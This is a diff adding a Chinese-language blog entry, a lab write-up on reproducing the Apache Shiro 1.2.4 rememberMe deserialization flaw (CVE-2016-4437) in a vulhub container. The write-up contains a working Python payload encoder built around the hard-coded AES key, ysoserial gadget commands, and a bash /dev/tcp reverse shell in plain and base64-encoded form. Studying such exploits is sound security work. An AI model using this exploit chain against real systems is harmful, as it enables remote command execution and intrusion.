@@ -5022,4 +5022,61 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</title>
+    <url>/2023/11/23/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</p>
+<ol>
+<li>复现环境中的反序列化漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，列出&#x2F;etc目录的文件结构，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
+<h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br> 然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul>
+<li>Python环境，java8环境</li>
+<li>ysoserial-all.jar -&gt; <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></li>
+<li>payload生成代码</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;poc.ser&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>从返回包中发现有<code>remember=deleteMe</code>的字样，可以大致确定配置有<code>shiro</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311252007202.png"></p>
+<p>使用<code>ysoserial</code>生成CommonsBeanutils1的Gadget：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311252007208.png"></p>
+<p>再使用写好的python脚本生成payload(python脚本与poc.ser在同一目录下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007121.png"></p>
+<p>将payload添加到cookie字段</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007645.png"></p>
+<p>发送数据包后，打开容器验证，成功创建<code>success</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311252007749.png"></p>
+<h1 id="反弹shell读取-etc目录"><a href="#反弹shell读取-etc目录" class="headerlink" title="反弹shell读取&#x2F;etc目录"></a>反弹shell读取&#x2F;etc目录</h1><p>在目标机上执行如下命令即可获得反弹shell，网站：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.137.1/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>但在这里指令需要加密（因为重定向和管道字符的使用方式在启动过程中的上下文没有意义），选择箭头指出的命令</p>
+<img data-src="https://images.gaifagafin.top/202311252007662.png" style="zoom:80%;" />
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样利用ysoserial生成序列化数据，再利用python脚本生成payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; poc2.ser</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202311252007633.png"></p>
+<p>发送payload之前需<strong>监听攻击机端口</strong>，将payload添加到请求包cookie字段后发送</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007088.png"></p>
+<p>成功反弹shell，查看&#x2F;etc目录</p>
+<p><img data-src="https://images.gaifagafin.top/202311252007752.png"></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
 </search>
